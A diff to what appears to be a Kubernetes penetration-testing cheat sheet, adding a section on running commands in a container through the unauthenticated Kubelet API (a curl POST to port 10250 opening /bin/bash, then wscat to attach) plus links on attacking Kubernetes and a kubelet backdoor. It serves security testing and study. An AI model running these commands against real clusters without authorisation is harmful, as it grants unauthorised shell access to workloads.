@@ -93,6 +93,21 @@ kubectl get pods --namespace=<namespace>
 kubectl exec <pod> -i --tty --namespace=<pod_namespace> -- /bin/bash
 ```
 
+#### Remotely execute commands in container via Kubelet API
+
+This is anonymous, for authenticated requests provide an Authorization header
+
+```
+curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=/bin/bash&stdin=true&stderr=true&stdout=true&tty=true
+```
+
+This will return a websocket stream location. To connect use the following:
+
+```
+wscat -c "https://kube-node-here:10250/cri/exec/PfWkLulG" --no-check
+```
+
+
 #### Get services
 
 ```
@@ -372,3 +387,5 @@ In most cases, the Kubernetes cluster is hosted in cloud services such as AWS, w
 * [Kubernetes Pentest Methodology Part 3](https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-3/)
 * [Container Escape Using Kernel Exploitation](https://www.cyberark.com/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation/)
 * [Attacking and Defending Kubernetes](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-2/)
+* [Securing and Attacking Kubernetes](https://www.slideshare.net/hacktivity/vincent-ruijter-securing-attacking-kubernetes)
+* [Analysis of a Kubernetes Backdoor](https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c)
